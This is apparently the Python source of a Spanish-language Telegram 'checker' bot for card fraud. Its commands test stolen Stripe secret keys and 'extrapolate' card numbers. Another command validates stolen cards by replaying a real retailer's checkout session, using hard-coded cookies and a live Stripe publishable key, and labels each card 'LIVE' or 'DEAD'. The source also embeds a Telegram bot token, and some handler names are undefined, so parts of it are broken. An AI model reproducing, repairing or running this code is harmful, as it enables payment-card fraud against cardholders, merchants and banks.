import logging
import os
import requests
import time
import string
import colorama
import json
import requests
import random
from asyncio import sleep
from colorama import Fore
from colorama import Style
from faker import Faker
from aiogram import Bot, Dispatcher, executor, types
from bs4 import BeautifulSoup

#-----FINAL DE LAS IBRETAS----#

#--- LLAMDOS DE ACCIONES --- #
comand = "/.,*-"
bot = bool(os.environ.get('bot', True))
token = os.environ.get("token", None)
#--- FINAL DEL LLAMDO ---#

#--- AQUI VA EL TOKEN ---#
bot = Bot(token="5756635180:AAEKZCrMGj7VfDTH_ktA38cOgirVcRoWL9U", parse_mode=types.ParseMode.HTML)
iniciar = Dispatcher(bot)
#--- FINAL DEL TOKEN Y SU FUNCION---#
##
session = requests.session()
##
# <-------- CREACION DE COMANDOS -------->



#===========[Start]==========#
@llamadodelbot.message_handler(commands=['start','iniciar'], commands_prefix=ejecucion)
async def helpstr(message: types.Message):
    
    await message.answer_chat_action("typing")
    
    context = await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙪𝙨 - <b>Live ✅  ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝙒𝙚𝙡𝙘𝙤𝙢𝙚 <b><a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}!</a></b>
<b>𝙋𝙖𝙧𝙖 𝙎𝙖𝙗𝙚𝙧 𝙇𝙤𝙨 𝘾𝙤𝙢𝙖𝙣𝙙𝙤𝙨 - </b> 
<b>/cmds</b>
- - - - - - - - - - - - - - - - - - - -
𝘾𝙝𝙖𝙩 𝙄𝘿 -  [<code>{message.chat.id}</code>] ↯
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
 """)
  
#===========[Fin Start]==========#


  
#===========[CMDS]==========#
@iniciar.message_handler(commands=['cmds'], commands_prefix=comand)
async def cmds(message: types.Message):
    await message.reply(f"""
==================
LISTA DE COMANDOS
==================
        """)

#===========[Fin CMDS]==========#


@iniciar.message_handler(commands=['info'], commands_prefix=comand)
async def helpstr(message: types.Message):
    await message.answer_chat_action("typing")
    await message.reply(f""" 
- - - - - - - - - - - - - - - - - - - - 
𝙄𝙣𝙛𝙤 ↯
𝘽𝙤𝙩 𝙎𝙩𝙖𝙩𝙪𝙨 - <b>Live ✅  ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘼𝙡𝙞𝙖𝙨 - <b>@{message.from_user.username} ↯</b>
𝙄𝘿 - [ <code>{message.from_user.id} </code> ] ↯
- - - - - - - - - - - - - - - - - - - - 
𝙏𝙞𝙥𝙤 𝘿𝙚 𝘾𝙝𝙖𝙩 - <b>{message.chat.type.capitalize()} ↯</b>
𝘾𝙝𝙖𝙩 𝙄𝘿 -  [<code>{message.chat.id}</code>] ↯
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
 """) 


#===========[ Sk Check]==========#
@iniciar.message_handler(commands= ["sk"], commands_prefix=comand)
async def rnd(message: types.Message):
    await message.answer_chat_action("typing")
    key = message.text[len('/sk '):]
    inciodeltiempo = time.perf_counter()
    skcheck = key[0:0 + 15]
    finsk = key[28:28 + 4]
    if not key:
        return await message.reply(
            f"""
<b>Ingresar correctamente el valor</b>: <code>/sk sk_live_51Gnxxxxxxxxxxxxxxxxxxxxxxxxxxhrh8</code>

""")
    cc= "4543218722787334"
    cvc= "780"
    mes= "07"
    ano= "2026"
    headers={
    "Content-Type": "application/x-www-form-urlencoded"
    }
    data={
    "card[number]": cc,
    "card[cvc]": cvc,
    "card[exp_month]": mes,
    "card[exp_year]": ano
    }
    pos = requests.post(f"https://api.stripe.com/v1/tokens",
        data=data, headers=headers, auth=(key, ""))
    finaldeltime = time.perf_counter()
    if 'Invalid API Key provided' in pos.text:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>SK Chk</b>
- - - - - - - - - - - - - - - - - - - - 
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>DEAD KEY ❌ ↯</b>
𝙠𝙚𝙮 - <b><code>{skcheck}xxxxxxxxxxxxx{finsk}</code> ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
    """)
    elif 'api_key_expired' in pos.text:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>SK Chk</b>
- - - - - - - - - - - - - - - - - - - - 
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>DEAD KEY ❌ ↯</b>
𝙠𝙚𝙮 - <b><code>{skcheck}xxxxxxxxxxxxx{finsk}</code> ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")
    elif 'testmode_charges_only' in pos.text:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>SK Chk</b>
- - - - - - - - - - - - - - - - - - - - 
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>DEAD KEY ❌ ↯</b>
𝙠𝙚𝙮 - <b><code>{skcheck}xxxxxxxxxxxxx{finsk}</code> ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")
    elif 'test_mode_live_card' in pos.text:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>SK Chk</b>
- - - - - - - - - - - - - - - - - - - - 
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>DEAD KEY ❌ ↯</b>
𝙠𝙚𝙮 - <b><code>{skcheck}xxxxxxxxxxxxx{finsk}</code> ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")
    else:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>SK Chk</b>
- - - - - - - - - - - - - - - - - - - - 
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>LIVE KEY ✅ ↯</b>
𝙠𝙚𝙮 - <b><code>{skcheck}xxxxxxxxxxxxx{finsk}</code> ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")

#===========[Fin Sk Check]==========#


#===========[Extrapolar Cc]==========#
@iniciar.message_handler(commands= ["extra"], commands_prefix=comand)
async def rnd(message: types.Message):

    inciodeltiempo = time.perf_counter()
    await message.answer_chat_action("typing")
    ccs = message.text[len('/extra '):]

    if not ccs:
           await message.reply("ESTA INGRESAANDO MAL LA CCS")


    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]

    extra = cc[0:0 + 12]
    finaldeltime = time.perf_counter()

    await message.reply(f"""
<b>
ExtraPoleado : <code>{extra}xxxx|{mes}|{ano}|{cvv}</code>

Time : {finaldeltime - inciodeltiempo:0.2} segundos </b>
""")

#=========[Fin Extrapolae Cc]==========#
    
    
    
#===========[Gate Sprock Chk]==========#

@iniciar.message_handler(commands= ["spk"], commands_prefix=comand)
async def chk(message: types.Message):
    inciodeltiempo = time.perf_counter()

    await message.answer_chat_action("typing")
    ccs = message.text[len('/spk '):]

    if not ccs:
           await message.reply("Vuelve a intentarlo.")

    spli = ccs.split('|')
    cc = spli[0]
    mes = spli[1]
    ano = spli[2]
    cvv = spli[3]

    nombre = "juan manuel santos"
    mail = "manueljaunsantos@gmail.com"
    
    inputm = message.text.split(None, 1)[1]
    bincode = 6
    BIN = inputm[:bincode]
    req = requests.get(f"https://bin-api-dragon.ga/bin/api/{BIN}").json()
            #capturas
    data = req["data"]
    vendor = data["vendor"]
    type = data["type"]
    level = data["level"]
    country = data["country"]
    bank = data["bank"]
    countryInfo = data["countryInfo"]
    name = countryInfo["name"]
    codea = countryInfo["code"]
    emoji = countryInfo["emoji"]
   
    
    cookies = {
    'dwac_eb83b5445ceb01c63da9991926': '7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o%3D|dw-only|||USD|false|US%2FEastern|true',
    'cqcid': 'acsGRQnukGKuoSAlTcFn2alPQF',
    'cquid': '||',
    'sid': '7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o',
    'dwanonymous_b9304412fd308f62a1edbd377f59f3b6': 'acsGRQnukGKuoSAlTcFn2alPQF',
    '__cq_dnt': '0',
    'dw_dnt': '0',
    'dwsid': 'oXj5Dmlut4AgCY9VhakygkPqb5Ge8IIgwD-uwigFOl-tbTvoa7YOinwLSzK_BX0c1ofQ-ky97t2p3EeeIMm6Ig==',
    '_gid': 'GA1.2.1075257567.1663292859',
    '__cq_uuid': 'acsGRQnukGKuoSAlTcFn2alPQF',
    '_fbp': 'fb.1.1663292861278.672876947',
    '_pin_unauth': 'dWlkPU1EaGhORFU0WmpBdFlqRXhOUzAwTjJVM0xUZ3daRGt0TVRoaU5qTXlOalprTWpWaw',
    'BVBRANDID': 'e3ec22d3-c7ff-4204-9c6e-3b19a1959858',
    'BVBRANDSID': '10cb540e-b786-4d74-87f5-ca579606a640',
    '__stripe_mid': 'c1331236-3c34-452d-b1e5-dd84de0dd87a5ff119',
    '__stripe_sid': '32e98acc-3a46-4b4a-a908-f6f8ec519082760817',
    'BVImplmain_site': '19940',
    '__cq_bc': '%7B%22bdmt-ToysRUs%22%3A%5B%7B%22id%22%3A%2212871932%22%7D%2C%7B%22id%22%3A%2212894051%22%7D%2C%7B%22id%22%3A%2213220600%22%7D%5D%7D',
    'cookieconsent_status': 'dismiss',
    '_ga': 'GA1.2.1211159942.1663292858',
    '__cq_seg': '0~0.18!1~-0.39!2~-0.09!3~-0.16!4~0.24!5~-0.36!6~0.22!7~0.58!8~0.27!9~-0.37!f0~3~2!n0~3',
    '_derived_epik': 'dj0yJnU9RUpENk9KY0xoYUtlTUZGa3FIRlRtSDNVXzlaelhXRTImbj1qejh5UDVHVmZaWHlCSHlIOHBPVGhnJm09MSZ0PUFBQUFBR01qMW1FJnJtPTEmcnQ9QUFBQUFHTWoxbUU',
    '_ga_98G3HYFZT4': 'GS1.1.1663292857.1.1.1663293984.0.0.0',}

    headers = {
    'authority': 'www.toysrus.com',
    'accept': '*/*',
    'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    # Already added when you pass json=
    # 'content-type': 'application/json',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'dwac_eb83b5445ceb01c63da9991926=7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o%3D|dw-only|||USD|false|US%2FEastern|true; cqcid=acsGRQnukGKuoSAlTcFn2alPQF; cquid=||; sid=7h2StYocULNPzAkTEaYB2AyPBCp9gmUTr_o; dwanonymous_b9304412fd308f62a1edbd377f59f3b6=acsGRQnukGKuoSAlTcFn2alPQF; __cq_dnt=0; dw_dnt=0; dwsid=oXj5Dmlut4AgCY9VhakygkPqb5Ge8IIgwD-uwigFOl-tbTvoa7YOinwLSzK_BX0c1ofQ-ky97t2p3EeeIMm6Ig==; _gid=GA1.2.1075257567.1663292859; __cq_uuid=acsGRQnukGKuoSAlTcFn2alPQF; _fbp=fb.1.1663292861278.672876947; _pin_unauth=dWlkPU1EaGhORFU0WmpBdFlqRXhOUzAwTjJVM0xUZ3daRGt0TVRoaU5qTXlOalprTWpWaw; BVBRANDID=e3ec22d3-c7ff-4204-9c6e-3b19a1959858; BVBRANDSID=10cb540e-b786-4d74-87f5-ca579606a640; __stripe_mid=c1331236-3c34-452d-b1e5-dd84de0dd87a5ff119; __stripe_sid=32e98acc-3a46-4b4a-a908-f6f8ec519082760817; BVImplmain_site=19940; __cq_bc=%7B%22bdmt-ToysRUs%22%3A%5B%7B%22id%22%3A%2212871932%22%7D%2C%7B%22id%22%3A%2212894051%22%7D%2C%7B%22id%22%3A%2213220600%22%7D%5D%7D; cookieconsent_status=dismiss; _ga=GA1.2.1211159942.1663292858; __cq_seg=0~0.18!1~-0.39!2~-0.09!3~-0.16!4~0.24!5~-0.36!6~0.22!7~0.58!8~0.27!9~-0.37!f0~3~2!n0~3; _derived_epik=dj0yJnU9RUpENk9KY0xoYUtlTUZGa3FIRlRtSDNVXzlaelhXRTImbj1qejh5UDVHVmZaWHlCSHlIOHBPVGhnJm09MSZ0PUFBQUFBR01qMW1FJnJtPTEmcnQ9QUFBQUFHTWoxbUU; _ga_98G3HYFZT4=GS1.1.1663292857.1.1.1663293984.0.0.0',
    'origin': 'https://www.toysrus.com',
    'referer': 'https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/Checkout-Begin?stage=payment',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',}

    json_data = {
    'paymentMethodType': 'card',
    'stripeCustomerRequired': True,
    'zoneId': 'default',
    'statementDescriptor': None,}

    response2 = requests.post('https://www.toysrus.com/on/demandware.store/Sites-ToysRUs-Site/en_US/__SYSTEM__SalesforcePayments-PreparePaymentIntent', cookies=cookies, headers=headers, json=json_data).json()
 
    CS = response2["clientSecret"]
    PI =CS.split('_sec')[0]
    #await message.reply(f"PI={PI}")


    #await message.reply(f"{CS}")


    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'es,es-ES;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Microsoft Edge";v="105", " Not;A Brand";v="99", "Chromium";v="105"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.33',}

    data = f'setup_future_usage=off_session&payment_method_data[type]=card&payment_method_data[billing_details][address][line1]=strate+456&payment_method_data[billing_details][address][city]=NY&payment_method_data[billing_details][address][state]=NY&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][email]=testnici1%40gmail.com&payment_method_data[billing_details][name]=manuel+andres&payment_method_data[billing_details][phone]=4567898765&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]=37ae7a60-ea56-40b2-9501-41db51e5912b3ad1bd&payment_method_data[muid]=c1331236-3c34-452d-b1e5-dd84de0dd87a5ff119&payment_method_data[sid]=32e98acc-3a46-4b4a-a908-f6f8ec519082760817&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2Fc58a815e4%3B+stripe-js-v3%2Fc58a815e4&payment_method_data[time_on_page]=107717&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51HbsUNBP9OQuEIrPQTov2wZCQlEOC0EniZrH71zXu970tAaLxliYcvffDyHgP3wO9xrKbrfY4TGDVgViEUjwQ4mL00oKOvo8WJ&_stripe_account=acct_1JNK02Pl154QSdJg&client_secret={CS}'

    response = requests.post(f'https://api.stripe.com/v1/payment_intents/{PI}/confirm', headers=headers, data=data).json()

    error = response["error"]
    codel = error["code"]
    messagea = error["message"]
    
    finaldeltime = time.perf_counter()

    #await message.reply(f"{messagea}")
    if '"cvc_check":"pass"' in codel:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CVV LIVE ✅ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")
    if 'Your card has insufficient funds.' in messagea:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CVV LIVE ✅ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")

    elif 'incorrect_cvc'in codel:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CCN LIVE ✅ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   
""")
    elif 'Your card does not support this type of purchase.' in messagea:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CC DEAD ❌ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>   

""")

    elif 'Your card was declined.' in messagea:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CC DEAD ❌ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>  
""")
    elif 'incorrect_number' in codel:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CC DEAD ❌ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>  

""")
    elif 'invalid_cvc' in codel:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CC DEAD ❌ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>{messagea} ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>  

""")
    else:
        await message.reply(f"""
- - - - - - - - - - - - - - - - - - - - 
𝙂𝙖𝙩𝙚𝙬𝙖𝙮 ↯: <b>Sprok</b>
- - - - - - - - - - - - - - - - - - - - 
𝘾𝘾 - <code>{ccs}</code> ↯
𝙎𝙩𝙖𝙩𝙪𝙨 -  <b>CC LIVE ✅ ↯</b>
𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 - <b>APROVED ↯</b>
- - - - - - - - - - - - - - - - - - - -
𝘽𝙞𝙣 - <b> {vendor} - {type} - {level} ↯</b>
𝘽𝙖𝙣𝙠 - <b>{bank} ↯</b>
𝘾𝙤𝙪𝙣𝙩𝙧𝙮 - <b>{name}({emoji}) ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙝𝙚𝙘𝙠𝙚𝙙 𝙗𝙮 - <b>@{message.from_user.username} ↯</b>
𝙏𝙚𝙨𝙩 𝙏𝙞𝙢𝙚 - <b>{finaldeltime - inciodeltiempo:0.5} Seconds ↯</b>
- - - - - - - - - - - - - - - - 
𝘾𝙧𝙚𝙖𝙙𝙤𝙧 - <b>@Shein0425 ↯</b>  
""")

#===========[Fin Gate Sprock]==========#

































































































































































































############################## B A N N E R#########################################
colorama.init()
print(Fore.GREEN+"""????????????????????????????????????????????????????????????????????????? 
 ¦¦¦¦¦¦¦¦¦¦¦            ¦¦¦¦¦         ¦¦¦¦¦¦¦¦¦             ¦¦¦¦¦     ¦¦¦                      
¦¦¦¦¦¦¦¦¦¦¦¦¦          ¦¦¦¦¦         ¦¦¦¦¦¦¦¦¦¦¦           ¦¦¦¦¦     ¦¦¦                       
 ¦¦¦¦    ¦¦¦¦  ¦¦¦¦¦¦  ¦¦¦¦¦¦¦      ¦¦¦¦    ¦¦¦¦   ¦¦¦¦¦¦  ¦¦¦¦¦¦¦   ¦¦¦¦  ¦¦¦¦¦ ¦¦¦¦¦  ¦¦¦¦¦¦ 
 ¦¦¦¦¦¦¦¦¦¦¦  ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦       ¦¦¦¦¦¦¦¦¦¦¦¦  ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦   ¦¦¦¦¦ ¦¦¦¦¦ ¦¦¦¦¦  ¦¦¦¦¦¦¦¦
 ¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦¦ ¦¦¦¦  ¦¦¦¦        ¦¦¦¦¦¦¦¦¦¦¦¦ ¦¦¦¦ ¦¦¦   ¦¦¦¦     ¦¦¦¦  ¦¦¦¦  ¦¦¦¦ ¦¦¦¦¦¦¦¦ 
 ¦¦¦¦    ¦¦¦¦¦¦¦¦ ¦¦¦¦  ¦¦¦¦ ¦¦¦    ¦¦¦¦    ¦¦¦¦ ¦¦¦¦  ¦¦¦  ¦¦¦¦ ¦¦¦ ¦¦¦¦  ¦¦¦¦¦ ¦¦¦  ¦¦¦¦¦¦¦  
¦¦¦¦¦¦¦¦¦¦¦ ¦¦¦¦¦¦¦¦   ¦¦¦¦¦¦¦     ¦¦¦¦¦   ¦¦¦¦¦¦¦¦¦¦¦¦¦   ¦¦¦¦¦¦¦  ¦¦¦¦¦  ¦¦¦¦¦¦¦   ¦¦¦¦¦¦¦¦ 
¦¦¦¦¦¦¦¦¦¦¦   ¦¦¦¦¦¦     ¦¦¦¦¦     ¦¦¦¦¦   ¦¦¦¦¦  ¦¦¦¦¦¦     ¦¦¦¦¦  ¦¦¦¦¦    ¦¦¦¦¦     ¦¦¦¦¦¦
????????????????????????????????????????????????????????????????????????? C O D E : SHEIN"""+ Style.RESET_ALL)
print("""[ Version : 1.0.1 ] 
[ Creador : S H E I N ]
[ Alias bot : [@SpaceChk_bot]

""")

